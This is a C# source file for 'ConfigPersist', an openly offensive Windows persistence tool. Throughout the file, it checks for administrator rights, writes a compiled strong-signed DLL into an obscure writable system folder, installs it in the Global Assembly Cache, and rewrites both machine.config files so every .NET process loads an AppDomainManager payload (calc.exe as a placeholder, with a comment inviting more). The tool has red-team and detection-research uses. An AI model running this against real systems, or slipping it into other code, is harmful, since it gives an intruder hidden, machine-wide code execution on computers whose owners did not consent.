// Author: NotoriousRebel
// Project: ConfigPersist

using System;
using System.CodeDom.Compiler;
using System.Xml;
using System.EnterpriseServices.Internal;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;

namespace ConfigPersist
{
    class Program
    {
        private static bool IsAdminorSystem()
        {
            bool isSystem;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                isSystem = identity.IsSystem;
            }

            return isSystem || WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        }

        /// <summary>
        /// Determines if a directory is writable.
        /// </summary>
        /// <param name="dirPath">Directory path.</param>
        /// <param name="throwIfFails">Bool so if fails throw an error.</param>
        /// <returns>bool that indicates if directory is writable.</returns>
        private static bool IsDirectoryWritable(string dirPath, bool throwIfFails = false)
        {
            // https://stackoverflow.com/questions/1410127/c-sharp-test-if-user-has-write-access-to-a-folder
            // Sanity check to see if we can place our compiled dll in our special path
            try
            {
                using (FileStream fs = File.Create(
                    Path.Combine(
                        dirPath,
                        Path.GetRandomFileName()),
                    1,
                    FileOptions.DeleteOnClose))
                {
                }

                return true;
            }
            catch
            {
                if (throwIfFails)
                {
                    throw;
                }
                else
                {
                    return false;
                }
            }
        }

        /// <summary>
        /// Determines where to place compiled assembly given list of paths.
        /// </summary>
        /// <returns>Randomly selected path from path list.</returns>
        private static string GetPath()
        {
            var winPath = "C:\\WINDOWS";
            var sys32 = $"{winPath}\\System32";

            // Thank you to matterpreter for this list :)
            List<string> paths = new List<string>
            {
                $"{sys32}\\microsoft\\crypto\rsa\\machinekeys",
                $"{winPath}\\syswow64\\tasks\\microsft\\windows\\pla\\system",
                $"{winPath}\\debug\\wia",
                $"{sys32}\\tasks",
                $"{winPath}\\syswow64\\tasks",
                $"{winPath}\\registration\\crmlog",
                $"{sys32}\\com\\dmp",
                $"{sys32}\\fxstmp",
                $"{sys32}\\spool\\drivers\\color",
                $"{sys32}\\spool\\printers",
                $"{sys32}\\spool\\servers",
                $"{winPath}\\syswow64\\com\\dmp",
                $"{winPath}\\syswow64\\fxstmp",
                $"{winPath}\\temp",
                $"{winPath}\\tracing",
            };
            paths = paths.FindAll(path => Directory.Exists(path) && IsDirectoryWritable(path));
            if (paths.Count == 0)
            {
                // Sanity check
                // If for some reason every path fails we will just use our current directory
                paths.Add(Environment.CurrentDirectory);
            }

            var random = new Random();

            // return random path where we will place our strong signed assembly
            return paths[random.Next(paths.Count)];
        }

        /// <summary>
        /// Loads our strong signed .net assembly into the GAC.
        /// </summary>
        /// <param name="path">Path to .net assembly.</param>
        private static bool InstallAssembly(string path)
        {
            try
            {
                var publisher = new Publish();
                publisher.GacInstall(path);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception occurred while attempting to install .net assembly into GAC {e}");
                return false;
            }

            return true;
        }

        /// <summary>
        /// Compiles our strong signed assembly based on code in string and places dll in dllPath.
        /// </summary>
        /// <param name="dllPath">Path where assembly will be placed</param>
        /// <returns>Tuple containing path, assembly full name, and conext of assembly</returns>
        private static Tuple<string, string, string> CompileDLL(string dllPath)
        {
            // Feel free to change the name ConfigHooking or namespace
            // Of course feel free to do more than just start calc :)
            var malCSharp = @"using System;
                namespace Context {
                    public sealed class ConfigHooking : AppDomainManager {
                        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
                            System.Diagnostics.Process.Start(""calc.exe"");
                            return;
                        }
                    }
                }
            ";
            CodeDomProvider objCodeCompiler = CodeDomProvider.CreateProvider("CSharp");
            var name = "test";

            // Generate name for strong signed .net assembly, will be name in GAC
            // Feel free to change name of output dll
            CompilerParameters cp = new CompilerParameters();

            // ADD reference assemblies here
            cp.ReferencedAssemblies.Add("System.dll");
            cp.TreatWarningsAsErrors = false;
            dllPath = $"{dllPath}\\{name}.dll";
            cp.OutputAssembly = dllPath;
            cp.GenerateInMemory = false;
            cp.CompilerOptions = "/optimize";

            // Make sure keyfile is named key.snk 
            // TODO allow option to encode file and store as string, write to disk, then delete after compilation.
            cp.CompilerOptions = File.Exists($"{Environment.CurrentDirectory}\\Keyfile\\key.snk") ? $"/keyfile:{Environment.CurrentDirectory}\\Keyfile\\key.snk" : $"/keyfile:{Environment.CurrentDirectory}\\key.snk";
            cp.IncludeDebugInformation = false;
            CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
            var types = cr.CompiledAssembly.GetExportedTypes();
            string context;
            try
            {
                context = types[0].ToString();
                Console.WriteLine($"inside try context is: {context}");
            }
            catch (Exception)
            {
                Console.WriteLine("types does not have length greater than 0");
                context = "null";
            }

            string asmFullName;
            try
            {
                asmFullName = cr.CompiledAssembly.FullName;
            }
            catch (Exception e)
            {
                Console.WriteLine("An exception occurred while trying to get fullname, most likely due to missing keyfile!");
                Console.WriteLine(e);
                asmFullName = $"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
            }

            if (cr.Errors.Count > 0)
            {
                Console.WriteLine("Build errors occurred");
                foreach (CompilerError ce in cr.Errors)
                {
                    Console.WriteLine(ce);
                }

                return Tuple.Create(string.Empty, string.Empty, string.Empty);
            }
            else
            {
                return Tuple.Create(dllPath, asmFullName, context);
            }
        }

        /// <summary>
        /// This is where the magic happens
        /// This is the core function that modifies the machine config
        /// It will modify it so at runtime our strong signed .net assembly will be called.
        /// </summary>
        /// <param name="configpath">Path to machine.config.</param>
        /// <param name="assemblyFullName">Full Name for Assembly.</param>
        private static bool FixConfig(string configpath, string assemblyFullName, string context)
        {
            try
            {
                Console.WriteLine($"inside fixConfig and assemblyFullName: {assemblyFullName}");
                XmlDocument doc = new XmlDocument();
                doc.Load(configpath);
                XmlNode node = doc.SelectSingleNode("/configuration/runtime");
                XmlElement ele = doc.CreateElement("appDomainManagerType");
                ele.SetAttribute("value", context ?? "Context.ConfigHooking");
                node.AppendChild(ele.Clone());
                XmlElement secondEle = doc.CreateElement("appDomainManagerAssembly");
                secondEle.SetAttribute("value", assemblyFullName);
                node.AppendChild(secondEle.Clone());
                doc.Save(configpath);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception has occurred while attempting to 'fix' config: {e}");
                return false;
            }

            return true;
        }

        static void Main(string[] args)
        {
            try
            {
                if (!IsAdminorSystem())
                {
                    Console.WriteLine("Must be administrator for technique to work, exiting program!");
                    Console.ReadLine();
                    Environment.Exit(-1);
                }

                Console.WriteLine(Environment.CurrentDirectory);
                var dirPath = GetPath();
                Console.WriteLine($"path is: {dirPath}");
                (string dllPath, string asmFullName, string context) = CompileDLL(dirPath);
                Console.WriteLine($"dllPath is {dllPath}");
                Console.WriteLine($"asmFullName is: {asmFullName}");
                Console.WriteLine($"context is: {context}");
                bool loaded = InstallAssembly(dllPath);
                if (loaded == false)
                {
                    throw new Exception("Unable to install assembly into GAC");
                }

                Console.WriteLine($"Successfully added assembly to CLR: {asmFullName}");

                var sysConfigFile = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
                Console.WriteLine($"sysConfigFile: {sysConfigFile}");

                var paths = new List<string>()
                {
                     sysConfigFile,
                     sysConfigFile.Contains("Framework") ? sysConfigFile.Replace("Framework", "Framework64") : sysConfigFile.Replace("Framework64", "Framework"),
                };

                // Hours wasted debugging this because it returns 32 bit version of .NET Framework
                foreach (var configPath in paths)
                {
                    Console.WriteLine($" ConfigPath: {configPath}");
                    FixConfig(configPath, asmFullName, context);
                }
                Console.ReadLine();
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error has occurred: {e}");
                Console.ReadLine();
            }
        }
    }
}
